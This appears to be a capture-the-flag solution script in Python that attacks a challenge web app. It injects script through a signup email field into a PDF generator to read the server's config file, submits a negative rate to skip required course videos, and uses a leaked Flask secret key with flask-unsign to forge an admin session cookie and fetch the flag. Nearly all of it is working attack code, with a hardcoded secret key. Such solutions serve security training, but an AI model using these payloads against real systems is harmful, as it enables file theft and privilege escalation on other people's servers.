import requests
import json
from itsdangerous import base64_decode
import zlib
import os

def decode(cookie):
    """Decode a Flask cookie."""
    try:
        compressed = False
        payload = cookie

        if payload.startswith('.'):
            compressed = True
            payload = payload[1:]

        data = payload.split(".")[0]

        data = base64_decode(data)
        if compressed:
            data = zlib.decompress(data)

        return data.decode("utf-8")
    except Exception as e:
        return "[Decoding error: are you sure this was a Flask session cookie? {}]".format(e)


url = 'http://onlineeducation.sstf.site/'

s = requests.session()

r = s.get(url)

# local file path to read
target = "file:///home/app/config.py"
payload = 'test@test.com\n'
# XSS in PDF generator
payload += '''
<script>
x=new XMLHttpRequest;
x.onload=function(){
    document.write(this.responseText)
};
x.open("GET","%s");
x.send();
</script>
'''%target
params = {'name':'name', 'email':payload}
r = s.post(url+'signin', data=params)
print(s.cookies['EduSession'])
print(decode(s.cookies['EduSession']))

# complete three courses
for i in range(3):
    r = s.post(url+'status', json={'action':'start'})
    print(s.cookies['EduSession'])
    print(decode(s.cookies['EduSession']))

    # negative rate to skip video
    r = s.post(url+'status', json={'action':'finish', 'rate':-1.0})
    print(s.cookies['EduSession'])
    print(decode(s.cookies['EduSession']))

# Now, we can get secret key from PDF file by visiting /cert with cookie
# here's leaked secret key
secret_key = '19eb794c831f30f099a31b1c095a17d6'

cookie = os.popen("flask-unsign --sign --cookie \"{'name': 'admin', 'is_admin': True}\" --secret "+secret_key).read().strip()
print(cookie)
for c in s.cookies:
    if c.name =='EduSession':
        c.value=cookie
r = s.get(url+'flag')
print(r.content)
